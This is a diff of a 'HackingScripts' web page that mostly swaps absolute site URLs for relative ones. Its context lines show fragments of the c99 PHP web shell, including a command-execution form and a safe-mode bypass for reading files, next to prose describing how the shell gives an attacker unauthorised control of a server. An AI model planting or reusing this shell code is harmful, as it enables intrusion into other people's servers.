@@ -4,11 +4,11 @@
     <meta charset='utf-8'>
     <meta http-equiv="X-UA-Compatible" content="chrome=1">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    <link rel="stylesheet" type="text/css" href="http://hackingscripts.com//stylesheets/stylesheet.css" media="screen" />
-    <link rel="stylesheet" type="text/css" href="http://hackingscripts.com//stylesheets/pygment_trac.css" media="screen" />
-    <link rel="stylesheet" type="text/css" href="http://hackingscripts.com//stylesheets/print.css" media="print" />
-    <link rel="stylesheet" type="text/css" href="http://hackingscripts.com//stylesheets/styles.css" media="print" />
-    <link rel="icon" type="image/x-icon" href="http://hackingscripts.com//favicon.ico">
+    <link rel="stylesheet" type="text/css" href="/stylesheets/stylesheet.css" media="screen" />
+    <link rel="stylesheet" type="text/css" href="/stylesheets/pygment_trac.css" media="screen" />
+    <link rel="stylesheet" type="text/css" href="/stylesheets/print.css" media="print" />
+    <link rel="stylesheet" type="text/css" href="/stylesheets/styles.css" media="print" />
+    <link rel="icon" type="image/x-icon" href="/favicon.ico">
 
 
     <!--[if lt IE 9]>
@@ -21,7 +21,7 @@
   <body>
     <header>
       <div class="inner">
-        <h1> <a href="http://hackingscripts.com//">HackingScripts</a> </h1>
+        <h1> <a href="/">HackingScripts</a> </h1>
         <h2>Hack Scripts for everybody</h2>
       </div>
     </header>
@@ -3030,7 +3030,7 @@
 <span class="lineno">2989</span> <span class="x">&lt;tr&gt;&lt;td width=&quot;50%&quot; height=&quot;1&quot; valign=&quot;top&quot;&gt;&lt;center&gt;&lt;b&gt;Enter: &lt;/b&gt;&lt;form action=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;&lt;input type=hidden name=act value=&quot;cmd&quot;&gt;&lt;input type=hidden name=&quot;d&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dispd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;cmd&quot; size=&quot;50&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;&lt;input type=hidden name=&quot;cmd_txt&quot; value=&quot;1&quot;&gt;&amp;nbsp;&lt;input type=submit name=submit value=&quot;Execute&quot;&gt;&lt;/form&gt;&lt;/td&gt;&lt;td width=&quot;50%&quot; height=&quot;1&quot; valign=&quot;top&quot;&gt;&lt;center&gt;&lt;b&gt;Select: &lt;/b&gt;&lt;form action=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">act=cmd&quot; method=&quot;POST&quot;&gt;&lt;input type=hidden name=act value=&quot;cmd&quot;&gt;&lt;input type=hidden name=&quot;d&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dispd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;&lt;select name=&quot;cmd&quot;&gt;</span><span class="cp">&lt;?php</span> <span class="k">foreach</span> <span class="p">(</span><span class="nv">$cmdaliases</span> <span class="k">as</span> <span class="nv">$als</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&lt;option value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$als</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$als</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;&lt;/option&gt;&quot;</span><span class="p">;}</span> <span class="cp">?&gt;</span><span class="x">&lt;/select&gt;&lt;input type=hidden name=&quot;cmd_txt&quot; value=&quot;1&quot;&gt;&amp;nbsp;&lt;input type=submit name=submit value=&quot;Execute&quot;&gt;&lt;/form&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/TABLE&gt; </span>
 <span class="lineno">2990</span> <span class="x">&lt;br&gt; </span>
 <span class="lineno">2991</span> <span class="x">&lt;TABLE style=&quot;BORDER-COLLAPSE: collapse&quot; cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=&quot;116&quot; width=&quot;100%&quot; bgColor=#333333 borderColorLight=#c0c0c0 border=1&gt; </span>
-<span class="lineno">2992</span> <span class="x">&lt;tr&gt;&lt;td height=&quot;1&quot; valign=&quot;top&quot; colspan=&quot;2&quot;&gt;&lt;p align=&quot;center&quot;&gt;&lt;b&gt;:: &lt;a href=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">act=cmd&amp;d=</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;&lt;b&gt;Shadow&#39;s tricks &lt;img src=&quot;http://hackingscripts.com//wp-includes/images/smilies/icon_biggrin.gif&quot; alt=&quot;:D&quot; class=&quot;wp-smiley&quot; /&gt; &lt;/b&gt;&lt;/a&gt; ::&lt;/b&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt; </span>
+<span class="lineno">2992</span> <span class="x">&lt;tr&gt;&lt;td height=&quot;1&quot; valign=&quot;top&quot; colspan=&quot;2&quot;&gt;&lt;p align=&quot;center&quot;&gt;&lt;b&gt;:: &lt;a href=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">act=cmd&amp;d=</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;&lt;b&gt;Shadow&#39;s tricks &lt;img src=&quot;/wp-includes/images/smilies/icon_biggrin.gif&quot; alt=&quot;:D&quot; class=&quot;wp-smiley&quot; /&gt; &lt;/b&gt;&lt;/a&gt; ::&lt;/b&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt; </span>
 <span class="lineno">2993</span> <span class="x">&lt;tr&gt; </span>
 <span class="lineno">2994</span> <span class="x">  &lt;td width=&quot;50%&quot; height=&quot;83&quot; valign=&quot;top&quot;&gt;&lt;center&gt; </span>
 <span class="lineno">2995</span> <span class="x">    &lt;div align=&quot;center&quot;&gt;Useful Commands </span>
@@ -3080,7 +3080,7 @@
 <span class="lineno">3039</span> <span class="x">    &lt;/td&gt; </span>
 <span class="lineno">3040</span> <span class="x">&lt;/tr&gt;&lt;/TABLE&gt;&lt;br&gt; </span>
 <span class="lineno">3041</span> <span class="x">&lt;TABLE style=&quot;BORDER-COLLAPSE: collapse&quot; cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=&quot;116&quot; width=&quot;100%&quot; bgColor=#333333 borderColorLight=#c0c0c0 border=1&gt; </span>
-<span class="lineno">3042</span> <span class="x">&lt;tr&gt;&lt;td height=&quot;1&quot; valign=&quot;top&quot; colspan=&quot;2&quot;&gt;&lt;p align=&quot;center&quot;&gt;&lt;b&gt;:: &lt;a href=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">act=cmd&amp;d=</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;&lt;b&gt;Preddy&#39;s tricks &lt;img src=&quot;http://hackingscripts.com//wp-includes/images/smilies/icon_biggrin.gif&quot; alt=&quot;:D&quot; class=&quot;wp-smiley&quot; /&gt; &lt;/b&gt;&lt;/a&gt; ::&lt;/b&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt; </span>
+<span class="lineno">3042</span> <span class="x">&lt;tr&gt;&lt;td height=&quot;1&quot; valign=&quot;top&quot; colspan=&quot;2&quot;&gt;&lt;p align=&quot;center&quot;&gt;&lt;b&gt;:: &lt;a href=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">act=cmd&amp;d=</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;&lt;b&gt;Preddy&#39;s tricks &lt;img src=&quot;/wp-includes/images/smilies/icon_biggrin.gif&quot; alt=&quot;:D&quot; class=&quot;wp-smiley&quot; /&gt; &lt;/b&gt;&lt;/a&gt; ::&lt;/b&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt; </span>
 <span class="lineno">3043</span> <span class="x">&lt;tr&gt; </span>
 <span class="lineno">3044</span> <span class="x">  &lt;td width=&quot;50%&quot; height=&quot;83&quot; valign=&quot;top&quot;&gt;&lt;center&gt; </span>
 <span class="lineno">3045</span> <span class="x">    &lt;div align=&quot;center&quot;&gt;Php Safe-Mode Bypass (Read Files) </span>
@@ -3165,7 +3165,7 @@
 
 <p>Once uploaded, this script creates a new page on the infected website. This page then provides the attacker with remote and unauthorised access to pretty much everything on the server, via a relatively pretty interface.<br>
 Here is a screenshot of the c99 shell in action:<br>
-<figure id="attachment_120" style="width: 604px;" class="wp-caption aligncenter"><a href="http://hackingscripts.com//wp-content/uploads/2014/01/c99-screenshot.png"><img src="http://hackingscripts.com//wp-content/uploads/2014/01/c99-screenshot-1024x680.png" alt="C99 shell script screenshot" width="604" height="401" class="size-large wp-image-120" /></a><figcaption class="wp-caption-text">C99 shell script screenshot</figcaption></figure><br>
+<figure id="attachment_120" style="width: 604px;" class="wp-caption aligncenter"><a href="/wp-content/uploads/2014/01/c99-screenshot.png"><img src="/wp-content/uploads/2014/01/c99-screenshot-1024x680.png" alt="C99 shell script screenshot" width="604" height="401" class="size-large wp-image-120" /></a><figcaption class="wp-caption-text">C99 shell script screenshot</figcaption></figure><br>
 You can also take a look at my non-functional <a href="http://hackingscripts.com/demos/c99shell-demo.htm" title="c99 script">demo c99 script</a>.<br>
 As you can see, the script allows the hacker to do all sorts of things, including the following:</p>
 
@@ -3188,13 +3188,13 @@ As you can see, the script allows the hacker to do all sorts of things, includin
         </section>
 
         <aside id="sidebar">
-          <a href="http://hackingscripts.com//upload/" class="button">
+          <a href="http://upload.hackingscripts.com" class="button">
             <small>Upload</small>
             a file
           </a>
 
 
-          <a href="http://hackingscripts.com//scripts/" class="button">
+          <a href="/scripts/" class="button">
             <small>The entire list of</small>
             hack scripts
           </a>
